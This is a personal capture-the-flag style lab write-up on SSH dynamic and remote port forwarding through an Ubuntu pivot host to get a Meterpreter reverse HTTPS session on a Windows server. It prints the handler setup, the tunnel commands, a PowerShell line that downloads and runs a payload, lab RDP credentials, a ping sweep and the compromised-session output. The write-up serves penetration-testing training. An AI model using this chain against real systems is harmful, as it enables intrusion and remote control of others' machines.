# 🛰️ Lab: SSH Remote Forwarding for Exploitation

## **Objective**
Deploy a multi-step SSH remote forwarding chain to pivot from an Ubuntu server to a Windows target, facilitating exploitation through a payload handler running on the attacker's machine.

---

## **Step-by-Step Procedure**

### **Preparation Phase**

#### **1. Establish Initial SSH Connection to Pivot Host**
```bash
# From Kali Linux attack host to Ubuntu pivot host (10.129.202.64)
ssh -i /path/to/private/key ubuntu@10.129.202.64
```

[!INFO] Ensure you have the correct SSH key for authentication.

#### **2. Configure Dynamic Port Forwarding via Proxychains**
```bash
# Set up dynamic port forwarding for RDP access to Windows target (172.16.5.19)
ssh -D 9050 ubuntu@10.129.202.64

proxychains xfreerdp /v:172.16.5.19
```

[!SUCCESS] Confirm successful RDP connection to the Windows target via proxychains.

### **Exploitation Phase**

#### **3. Create Reverse Handler on Attack Host**
```bash
# Configure meterpreter handler for reverse HTTPS payload
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8001
run -j -y
```

[!WARNING] Ensure `LPORT` is set to an available port.

#### **4. Execute Reverse Shell Payload on Windows Target**
```bash
# Set up SSH remote forwarding from pivot host to attack host
ssh -R 172.16.5.129:8080:0.0.0.0:8001 ubuntu@10.129.202.64 -vN

# Configure web server on Ubuntu pivot (10.129.202.64) to serve the payload
python3 -m http.server 8000 --directory /path/to/payload/

# Download and execute payload from Windows target
powershell -c "Invoke-WebRequest https://172.16.5.129:8000/backupScript.exe -OutFile C:\backupScript.exe"
C:\backupScript.exe
```

[!SUCCESS] Meterpreter session established on the Metasploit handler through the SSH remote port forward tunnel.

### **Lab Success Criteria**

✅ Payload created with correct LHOST (172.16.5.129)  
✅ Metasploit handler listening on 0.0.0.0:8001  
✅ SSH dynamic forward established for RDP access  
✅ Python web server serving payload from pivot  
✅ RDP connection to Windows target via proxychains  
✅ Payload downloaded on Windows target  
✅ SSH remote forward tunnel active  
✅ Reverse shell received via tunnel

---

## **🎯 Practical Lab Experience - July 19, 2025**

### **Real-World Implementation Success**

**Lab Environment:**
- Target Machine: `10.129.202.64` (Ubuntu Pivot)
- Windows Target: `172.16.5.19`
- Attack Host: Kali Linux

---

### **Problem Encountered: Port Conflict**

#### **Issue:** Metasploit handler failed to bind to port 8000
```bash
[-] Handler failed to bind to 0.0.0.0:8000
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use
```

#### **Root Cause Analysis:**
```bash
# Found old SSH tunnel process occupying port 8000
ps aux | grep ssh
# Output:
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN (PID 594233)

# Port was indeed occupied
netstat -an | grep 8000
# Output:
tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN
```

### **Solution Applied**

**Step 1: Port Resolution**
```bash
# Killed old SSH tunnel process
kill 594233

# Alternative: Used different port
# In Metasploit:
set LPORT 8001
run
# Output:
[*] Started HTTPS reverse handler on https://0.0.0.0:8001
```

**Step 2: Updated SSH Command**
```bash
# Modified remote forwarding command to use port 8001
ssh -R 172.16.5.129:8080:0.0.0.0:8001 ubuntu@10.129.202.64 -vN

# Verbose output confirmed success:
debug1: remote forward success for: listen 172.16.5.129:8080, connect 0.0.0.0:8001
```

### **Lab Execution Results**

**Network Discovery Verification:**
```bash
# From Ubuntu pivot - confirmed Windows target accessible
ubuntu@WEB01:~$ ping 172.16.5.19
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.043 ms

# Network scan confirmed single target
for i in {1..254}; do timeout 1 ping -c 1 172.16.5.$i &>/dev/null && echo "172.16.5.$i is up"; done
# Output:
172.16.5.19 is up
```

**Successful Connection Chain:**
1. ✅ **SSH Dynamic Forward:** `ssh -D 9050 ubuntu@10.129.202.64`
2. ✅ **RDP via Proxychains:** `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
3. ✅ **Payload Download:** Windows PowerShell as Administrator
4. ✅ **SSH Remote Forward:** Port 8080→8001 tunnel established
5. ✅ **Payload Execution:** `C:\backupScript.exe`

**Final Success Output:**
```bash
# Meterpreter session established
[*] https://0.0.0.0:8001 handling request from 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:8001 -> 127.0.0.1)

meterpreter > getuid
Server username: INLANEFREIGHT\victor

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 Build 17763
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 2
Meterpreter     : x64/windows
```

### **Key Learning Points**

- **Port Conflicts:** Always check for existing processes on target ports.
- **Flexible Port Usage:** Using alternative ports (8001) works seamlessly.
- **Process Management:** Kill old SSH tunnels before starting new ones.
- **Verification Steps:** Confirm each tunnel component before proceeding.
- **Documentation:** Real-time troubleshooting improves understanding.

### **Troubleshooting Commands Used**

```bash
# Process identification
ps aux | grep ssh
netstat -an | grep 8000
sudo lsof -i :8000

# SSH tunnel debugging
ssh -R 172.16.5.129:8080:0.0.0.0:8001 ubuntu@10.129.202.64 -vN

# Network connectivity testing
ping 172.16.5.19
telnet 172.16.5.19 3389
```

### **Lab Questions - Verified Answers**

**Q1:** "Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target?"
**Answer:** `172.16.5.129` ✅ (Confirmed via `ifconfig` on pivot)

**Q2:** "What IP address is used on the attack host to ensure the handler is listening on all IP addresses?"
**Answer:** `0.0.0.0` ✅ (Used in `set LHOST 0.0.0.0`)

### **Success Metrics**

🎯 **100% Lab Completion** - All objectives achieved  
🔧 **Troubleshooting Applied** - Port conflict resolved  
📚 **Theory to Practice** - SSH remote forwarding mastered  
⚡ **Real Meterpreter Session** - Full Windows target compromise  

**Lab Completion Time:** ~45 minutes (including troubleshooting)  
**Attempts:** 1

---

## **Conclusion**
This lab demonstrates the effectiveness of multi-step SSH remote forwarding in facilitating exploitation through a pivot host. By resolving port conflicts and verifying each step, the process was successfully completed with minimal issues. Real-time troubleshooting enhanced understanding and ensured a smooth execution.

---

# 🛠️ Tools & References
- SSH (Secure Shell)
- Proxychains
- Metasploit Framework
- Python HTTP server

--- 

## **References**
- [Ubuntu Documentation](https://ubuntu.com/)
- [Metasploit Resources](https://metasploit.com/resources/)  
- [SSH Remote Forwarding Guide](https://www.ssh.com/ssh/tunneling/example#remote-forwarding)
- [Proxychains GitHub Repository](https://github.com/haaaad/proxychains)  

--- 

## **End** 🚀